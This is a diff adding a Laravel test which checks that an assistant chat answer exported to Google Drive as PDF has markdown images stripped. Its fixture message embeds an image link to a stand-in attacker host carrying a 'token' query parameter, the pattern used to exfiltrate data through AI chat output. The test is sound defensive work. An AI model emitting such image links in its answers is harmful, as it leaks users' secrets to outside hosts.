@@ -86,6 +86,72 @@ class GoogleDriveUploadTest extends TestCase
         ]);
     }
 
+    public function test_chat_answer_upload_strips_markdown_images_before_export(): void
+    {
+        Storage::fake('local');
+
+        $user = User::factory()->create();
+        $conversation = Conversation::create([
+            'user_id' => $user->id,
+            'title' => 'Drive answer upload',
+        ]);
+        $message = Message::create([
+            'conversation_id' => $conversation->id,
+            'role' => 'assistant',
+            'content' => 'Aman ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com).',
+        ]);
+
+        $exportService = Mockery::mock(DocumentExportService::class);
+        $exportService->shouldReceive('exportContent')
+            ->once()
+            ->with(Mockery::on(function (string $html): bool {
+                return str_contains($html, 'Aman')
+                    && str_contains($html, '<a href="https://example.com">tautan</a>')
+                    && ! str_contains($html, '<img')
+                    && ! str_contains($html, 'https://evil.test');
+            }), 'pdf', 'ista-ai-jawaban-'.$message->id)
+            ->andReturn([
+                'body' => '%PDF-1.4 sanitized chat answer',
+                'content_type' => 'application/pdf',
+                'file_name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
+            ]);
+
+        $this->app->instance(DocumentExportService::class, $exportService);
+
+        $googleDriveService = Mockery::mock(GoogleDriveService::class);
+        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
+            ->byDefault()
+            ->andReturn(true);
+        $googleDriveService->shouldReceive('uploadFromPath')
+            ->once()
+            ->with(Mockery::on(function (string $path): bool {
+                return is_file($path) && file_get_contents($path) === '%PDF-1.4 sanitized chat answer';
+            }), 'ista-ai-jawaban-'.$message->id.'.pdf', 'application/pdf', null)
+            ->andReturn([
+                'external_id' => 'drive-sanitized-answer-id',
+                'name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
+                'mime_type' => 'application/pdf',
+                'web_view_link' => 'https://drive.google.com/file/d/drive-sanitized-answer-id/view',
+                'folder_external_id' => 'folder-upload-id',
+                'size_bytes' => 2048,
+            ]);
+
+        $this->app->instance(GoogleDriveService::class, $googleDriveService);
+
+        Livewire::actingAs($user)
+            ->test(ChatIndex::class)
+            ->call('saveAnswerToGoogleDrive', $message->id, 'pdf');
+
+        $this->assertDatabaseHas('cloud_storage_files', [
+            'user_id' => $user->id,
+            'provider' => 'google_drive',
+            'direction' => CloudStorageFile::DIRECTION_EXPORT,
+            'local_type' => Message::class,
+            'local_id' => $message->id,
+            'external_id' => 'drive-sanitized-answer-id',
+        ]);
+    }
+
     public function test_chat_answer_spreadsheet_upload_requires_table_content(): void
     {
         $user = User::factory()->create();
